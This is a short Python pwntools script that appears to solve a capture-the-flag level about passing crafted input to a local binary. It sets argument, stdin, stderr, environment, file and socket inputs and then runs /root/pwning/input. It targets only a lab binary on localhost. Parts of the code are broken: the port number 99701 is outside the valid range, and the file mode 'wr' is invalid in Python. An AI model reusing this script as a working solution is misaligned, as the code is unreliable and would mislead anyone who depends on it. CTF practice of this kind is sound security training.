from pwn import*
import os

port = 99701
argv = ['a.out'] + ['A' for x in range(0, 64)] + [''] + ['\x20\x0a\x0d'] + [str(port)] + ['A' for x in range(0, 32)]
env =('\xde\xad\xbe\xef', '\xca\xfe\xba\xbe')
r0, w0 = os.pipe()
r2, w2 = os.pipe()

pid = os.fork()

if pid == 0:
    with open('\x0a', 'wr') as file:
        file.write('\x00\x00\x00\x00')
    os.close(w0)
    os.close(w2)
    os.dup2(r0, 0)
    os.dup2(r2, 2)
    os.putenv(env[0], env[1])
    os.execv('/root/pwning/input', argv)
else:
    os.close(r0)
    os.close(r2)
    os.write(w0, '\x00\x0a\x00\xff')
    os.write(w2, '\x00\x0a\x02\xff')
    os.close(w0)
    os.close(w2)
    r = remote('localhost', port)
    r.send('\xde\xad\xbe\xef')

